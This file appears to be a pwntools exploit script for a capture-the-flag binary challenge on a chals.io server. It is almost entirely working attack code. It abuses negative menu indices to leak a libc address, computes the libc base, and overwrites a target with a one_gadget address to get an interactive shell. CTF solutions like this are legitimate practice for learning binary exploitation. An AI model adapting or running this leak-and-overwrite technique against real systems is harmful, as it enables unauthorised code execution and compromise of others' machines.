#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
e = ELF(args.BIN)

if args.LIBC:
    libc = ELF(args.LIBC)
else:
    libc = e.libc

r = ROP([e, libc])

gs = '''
continue
'''

RHOST = '0.cloud.chals.io'
RPORT = '14881'

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(RHOST, RPORT)
    else:
        return process(e.path)
p = start()

# Fun stuff goes here
p.sendline(b'Your mom')
p.sendline(b'4')
p.sendline(b'-20')
p.recvuntil(b'these coordinates: ')


leak = int(p.recvline().strip())
libc.address = leak - 0x1ec6a0
log.info('Libc base found at: ' + hex(libc.address))
one_gadget = libc.address + 0xe6c81
log.info('Using one gadget at: ' + hex(one_gadget))

p.sendline(b'3')
p.sendline(b'-3')
p.sendline(bytes(str(one_gadget), 'ascii'))

p.interactive()

